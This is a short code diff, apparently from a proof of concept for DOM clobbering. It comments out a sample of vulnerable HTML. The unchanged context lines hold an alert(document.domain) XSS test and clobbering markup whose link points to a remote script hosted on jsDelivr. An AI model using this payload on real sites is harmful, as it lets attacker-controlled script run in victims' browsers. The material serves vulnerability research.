@@ -3,6 +3,7 @@ alert(document.domain);
 //<span id=someObject><a id=someObject name=url href=https://cdn.jsdelivr.net/gh/Rajiv-Stha/payload@main/x.js>
 
 // vuln code (DOM Clobbering)
+/*
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -37,3 +38,4 @@ alert(document.domain);
     </script>
   </body>
 </html>
+*/
